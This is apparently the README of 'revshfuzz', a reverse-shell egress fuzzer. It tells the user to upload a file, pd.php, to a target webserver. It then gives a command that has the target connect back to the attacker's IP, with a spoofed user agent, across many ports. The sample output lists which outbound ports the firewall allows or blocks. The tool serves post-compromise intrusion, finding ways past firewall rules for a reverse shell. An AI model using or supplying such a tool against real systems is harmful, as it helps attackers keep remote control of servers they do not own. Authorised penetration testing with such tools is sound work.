# revshfuzz
A tool for fuzzing for ports that allow outgoing connections

I recommend stopping all listening services as they could interfere with the binding in the script!

1 - Edit pd.php to your machines IP then upload pd.php to target webserver
2 - sudo ./revshfuzz.py -h

[pinky][0xefbeadde][revshfuzz]
| sudo ./revshfuzz.py -u http://192.168.1.13/pd.php -m c -b 192.168.1.7 -ua "spoofed-user-agent"

-=< Reverse Shell Fuzzer 0.0.2 >=-
By @Pink_P4nther <pinkp4nther@protonmail.com>
A weak firewall rule discovery tool

[*] URL: http://192.168.1.13/pd.php
[*] MODE: c
[*] Bind Address: 192.168.1.7
[*] User Agent: spoofed-user-agent
[+] Outbound [Allowed] @ Port: 20
[+] Outbound [Allowed] @ Port: 21
[+] Outbound [Allowed] @ Port: 22
[+] Outbound [Allowed] @ Port: 23
[+] Outbound [Allowed] @ Port: 25
[+] Outbound [Allowed] @ Port: 53
[+] Outbound [Blocked] @ Port: 80
[+] Outbound [Allowed] @ Port: 81
[+] Outbound [Allowed] @ Port: 110
[+] Outbound [Blocked] @ Port: 139
[+] Outbound [Blocked] @ Port: 143
[+] Outbound [Blocked] @ Port: 443
[+] Outbound [Allowed] @ Port: 445
[+] Outbound [Allowed] @ Port: 465
[+] Outbound [Allowed] @ Port: 587
[+] Outbound [Allowed] @ Port: 993
[+] Outbound [Allowed] @ Port: 995
[+] Outbound [Allowed] @ Port: 2222
[+] Outbound [Blocked] @ Port: 3306
[+] Outbound [Allowed] @ Port: 8000
[+] Outbound [Blocked] @ Port: 8080
[+] Outbound [Allowed] @ Port: 8181
[+] Outbound [Allowed] @ Port: 8443
[+] Outbound [Allowed] @ Port: 9050
[*] Finished

